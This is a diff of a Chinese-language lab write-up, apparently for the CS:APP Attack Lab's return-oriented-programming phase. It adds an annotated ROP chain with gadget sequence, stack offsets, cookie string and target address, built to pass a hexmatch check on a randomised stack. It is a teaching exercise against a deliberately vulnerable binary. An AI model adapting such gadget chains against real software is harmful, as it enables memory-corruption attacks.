@@ -118,39 +118,26 @@ ret
 
 这一问由于加入了随机栈的因素，相比前者会稍微复杂一些。
 
-需要保证的是：rdi
+需要保证的是：rdi指向栈上的字符串以通过hexmatch检测。
 
-
-
-
-
-
-
-
-
-
+经过复杂的查找与构建，可以得到如下ROP链：(注：相关nop指令已被略去)
 
 ```bash
-pop rax
-ret
-mov ecx,rax
-ret
-mov edx,ecx
-ret
-mov esi,edx
-ret
-mov rax,rsp
-ret
-mov rdi,rax
-ret
-lea rax,[rdi+rsi*1]
-ret
-mov rdi,rax
-ret
+0x88 pop rax;ret	
+0x90 0x20	#rax=0x20,RSP=0x98
+0x98 mov ecx,rax;ret	
+0xa0 mov edx,ecx;xchg ecx,eax;ret#经理论分析与gdb调试证明这两个寄存器值相同，交换不影响;rdx=0x20
+0xa8 mov esi,edx;ret#rsi=0x20
+0xb0 mov rax,rsp;ret
+0xb8 mov rdi,rax;ret#rdi=0xb8,RSP=0xc0
+0xc0 lea rax,[rdi+rsi*1];ret#rax=0xb8+0x20=0xd8
+0xc8 mov rdi,rax;ret#rdi=0xd8,指向0xd8
+0xd0 $0x401e69
+0xd8 "7fef911b\0"
 ```
-
-(实际上中间还会出现xchg ecx,eax指令，不过两个寄存器的值相同，经gdb调试可知不影响结果)
 
 最终得到的shellcode如下：
 
-![image-20260512131044454](./images/image-20260512131044454.png)
+![20](./images/20.png)
+
+![21](./images/21.png)
